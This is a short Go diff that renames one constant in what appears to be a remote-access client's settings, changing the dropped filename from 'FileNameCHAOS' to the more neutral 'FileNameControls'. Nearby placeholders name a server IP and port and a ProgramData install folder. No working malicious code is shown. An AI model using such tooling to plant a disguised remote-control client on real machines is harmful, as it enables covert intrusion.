@@ -17,7 +17,7 @@ import (
 
 const (
 	IP                 = "IPAddress:ServerPort"
-	FILENAME           = "FileNameCHAOS"
+	FILENAME           = "FileNameControls"
 	FOLDER_PATH        = "\\ProgramData"
 	FOLDER_EXT         = "\\NameFolderExtesion"
 	newLine     string = "\n"
